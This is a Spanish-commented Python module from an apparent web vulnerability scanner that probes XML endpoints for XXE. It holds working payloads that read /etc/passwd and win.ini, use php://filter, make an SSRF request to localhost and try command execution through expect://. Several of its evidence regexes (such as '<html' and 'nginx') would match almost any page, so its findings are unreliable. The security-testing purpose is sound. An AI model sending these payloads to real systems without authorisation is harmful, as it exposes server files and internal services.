"""
Módulo de detección de XXE (XML External Entity).
Detecta vulnerabilidades de inyección de entidades externas XML.
"""

import requests
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from core.base_module import VulnerabilityModule
from core.logger import get_logger
from datetime import datetime
import json
import os


class XXEModule(VulnerabilityModule):
    """
    Detecta vulnerabilidades XXE (XML External Entity) en aplicaciones web.
    """
    
    # Payloads XXE básicos
    BASIC_PAYLOADS = [
        # XXE clásico - lectura de archivos
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
        
        # XXE con parámetro externo
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root><data>test</data></root>''',
        
        # XXE para Windows
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
        
        # XXE con PHP wrapper
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>''',
        
        # XXE SSRF interno
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]>
<root><data>&xxe;</data></root>''',
        
        # XXE con expect (RCE)
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>''',
    ]
    
    # Patrones de evidencia XXE
    XXE_EVIDENCE_PATTERNS = [
        # Linux
        r'root:.*:0:0:',
        r'/bin/bash',
        r'/bin/sh',
        
        # Windows
        r'\[fonts\]',
        r'\[extensions\]',
        r'for 16-bit app support',
        
        # Errores XML
        r'XML.*?parsing.*?error',
        r'DOCTYPE.*?not allowed',
        r'Entity.*?not defined',
        r'External entity',
        r'SimpleXMLElement',
        r'DOMDocument',
        r'libxml',
        
        # Respuestas de localhost
        r'<html',
        r'Apache',
        r'nginx',
    ]

    def __init__(self, config):
        super().__init__(config)
        self.logger = get_logger("xxe_module")
        self.target_url = config.get("target_url")
        self.findings = []
        self.tested_endpoints = set()
        self.scan_timestamp = config.get("scan_timestamp", datetime.now().strftime("%Y%m%d_%H%M%S"))
        self.report_dir = config.get("report_dir", f"reports/scan_{self.scan_timestamp}")
        self.timeout = config.get("timeout", 10)

    def scan(self):
        """Ejecuta el escaneo completo de XXE."""
        self.logger.info(f"[XXE] Iniciando escaneo de XXE en: {self.target_url}")
        
        try:
            # 1. Detectar endpoints que aceptan XML
            xml_endpoints = self._discover_xml_endpoints()
            
            if not xml_endpoints:
                self.logger.warning("[XXE] No se encontraron endpoints que acepten XML")
                return
            
            self.logger.info(f"[XXE] Encontrados {len(xml_endpoints)} endpoints XML")
            
            # 2. Probar XXE en cada endpoint
            self._test_xxe_injection(xml_endpoints)
            
            # 3. Exportar resultados
            self._export_results()
            
            # Resumen
            critical = len([f for f in self.findings if f["severity"] == "critical"])
            high = len([f for f in self.findings if f["severity"] == "high"])
            
            self.logger.info(f"[XXE] Escaneo completado: {len(self.findings)} hallazgos")
            self.logger.info(f"[XXE] Severidad: Critical={critical}, High={high}")
            
        except Exception as e:
            self.logger.error(f"[XXE] Error inesperado: {e}")


    def _discover_xml_endpoints(self):
        """Descubre endpoints que aceptan XML."""
        xml_endpoints = []
        
        try:
            # Obtener página principal
            response = requests.get(self.target_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 1. Buscar formularios que puedan aceptar XML
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'post').upper()
                action_url = urljoin(self.target_url, action) if action else self.target_url
                
                # Priorizar endpoints con nombres relacionados a XML/API
                if any(keyword in action_url.lower() for keyword in ['xml', 'api', 'soap', 'rest', 'upload']):
                    xml_endpoints.append({
                        'url': action_url,
                        'method': method,
                        'type': 'form'
                    })
            
            # 2. Endpoints comunes de API
            common_api_paths = [
                '/api/xml',
                '/api/upload',
                '/upload',
                '/import',
                '/soap',
                '/xmlrpc',
                '/api/v1/xml',
                '/api/v2/xml',
            ]
            
            parsed = urlparse(self.target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            for path in common_api_paths:
                test_url = urljoin(base_url, path)
                xml_endpoints.append({
                    'url': test_url,
                    'method': 'POST',
                    'type': 'api'
                })
            
            # 3. Si la URL actual parece ser un endpoint XML
            if any(keyword in self.target_url.lower() for keyword in ['xml', 'api', 'soap']):
                xml_endpoints.append({
                    'url': self.target_url,
                    'method': 'POST',
                    'type': 'direct'
                })
            
            self.logger.info(f"[XXE] Descubiertos {len(xml_endpoints)} endpoints XML potenciales")
            
        except Exception as e:
            self.logger.error(f"[XXE] Error descubriendo endpoints XML: {e}")
        
        return xml_endpoints


    def _test_xxe_injection(self, xml_endpoints):
        """Prueba XXE injection en los endpoints."""
        self.logger.info("[XXE] Probando XXE injection...")
        
        for endpoint in xml_endpoints:
            endpoint_key = f"{endpoint['url']}:{endpoint['method']}"
            if endpoint_key in self.tested_endpoints:
                continue
            
            self.tested_endpoints.add(endpoint_key)
            
            # Primero verificar si el endpoint acepta XML
            if not self._accepts_xml(endpoint):
                continue
            
            for payload in self.BASIC_PAYLOADS:
                try:
                    # Enviar payload XXE
                    headers = {
                        'Content-Type': 'application/xml',
                        'Accept': 'application/xml, text/xml, */*'
                    }
                    
                    if endpoint['method'] == 'POST':
                        response = requests.post(
                            endpoint['url'],
                            data=payload,
                            headers=headers,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    else:
                        response = requests.request(
                            endpoint['method'],
                            endpoint['url'],
                            data=payload,
                            headers=headers,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    
                    # Verificar si hay evidencia de XXE
                    evidence = self._detect_xxe_evidence(response.text, payload)
                    
                    if evidence:
                        severity = "critical" if "passwd" in payload or "win.ini" in payload else "high"
                        
                        finding = {
                            "type": "xxe_injection",
                            "severity": severity,
                            "title": f"XXE (XML External Entity) en {endpoint['url']}",
                            "description": f"El endpoint '{endpoint['url']}' es vulnerable a XXE. Se detectó procesamiento de entidades externas XML, permitiendo lectura de archivos locales o SSRF.",
                            "cvss": 9.1 if severity == "critical" else 7.5,
                            "cwe": "CWE-611",
                            "owasp": "A05:2021 - Security Misconfiguration",
                            "recommendation": "Deshabilitar el procesamiento de entidades externas en el parser XML. Usar configuraciones seguras: libxml_disable_entity_loader(true) en PHP, setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true) en Java.",
                            "references": [
                                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                                "https://portswigger.net/web-security/xxe"
                            ],
                            "evidence": {
                                "url": endpoint['url'],
                                "method": endpoint['method'],
                                "payload": payload[:200] + "..." if len(payload) > 200 else payload,
                                "evidence_found": evidence,
                                "response_snippet": self._get_context_snippet(response.text, evidence),
                                "vulnerable": True
                            }
                        }
                        
                        self.findings.append(finding)
                        self.logger.warning(f"[XXE] XXE encontrado: {endpoint['url']}")
                        break  # Un payload exitoso es suficiente
                    
                    time.sleep(0.2)
                    
                except Exception as e:
                    self.logger.debug(f"[XXE] Error probando {endpoint['url']}: {e}")


    def _accepts_xml(self, endpoint):
        """Verifica si el endpoint acepta XML."""
        try:
            # Enviar XML simple para verificar
            simple_xml = '<?xml version="1.0"?><root><test>data</test></root>'
            headers = {
                'Content-Type': 'application/xml',
                'Accept': 'application/xml, text/xml, */*'
            }
            
            response = requests.request(
                endpoint['method'],
                endpoint['url'],
                data=simple_xml,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Si no devuelve 415 (Unsupported Media Type), probablemente acepta XML
            if response.status_code != 415:
                return True
            
        except Exception as e:
            self.logger.debug(f"[XXE] Error verificando XML en {endpoint['url']}: {e}")
        
        return False

    def _detect_xxe_evidence(self, response_text, payload):
        """Detecta evidencia de XXE en la respuesta."""
        for pattern in self.XXE_EVIDENCE_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    def _get_context_snippet(self, text, evidence, context_size=150):
        """Obtiene un snippet del contexto donde aparece la evidencia."""
        try:
            index = text.find(evidence)
            if index == -1:
                return "Evidencia encontrada (contexto no disponible)"
            
            start = max(0, index - context_size)
            end = min(len(text), index + len(evidence) + context_size)
            
            snippet = text[start:end]
            return f"...{snippet}..."
        except:
            return "Contexto no disponible"

    def _export_results(self):
        """Exporta los hallazgos a JSON."""
        try:
            os.makedirs(self.report_dir, exist_ok=True)
            
            output_data = {
                "scan_info": {
                    "target": self.target_url,
                    "timestamp": self.scan_timestamp,
                    "module": "xxe",
                    "total_findings": len(self.findings),
                    "tested_endpoints": len(self.tested_endpoints)
                },
                "findings": self.findings,
                "summary": {
                    "critical": len([f for f in self.findings if f["severity"] == "critical"]),
                    "high": len([f for f in self.findings if f["severity"] == "high"]),
                    "medium": len([f for f in self.findings if f["severity"] == "medium"]),
                    "low": len([f for f in self.findings if f["severity"] == "low"])
                }
            }
            
            output_path = os.path.join(self.report_dir, "xxe_findings.json")
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)
            
            self.logger.info(f"[XXE] Resultados exportados en: {output_path}")
            
        except Exception as e:
            self.logger.error(f"[XXE] Error al exportar resultados: {e}")

    def get_results(self):
        """Devuelve los hallazgos encontrados."""
        return self.findings
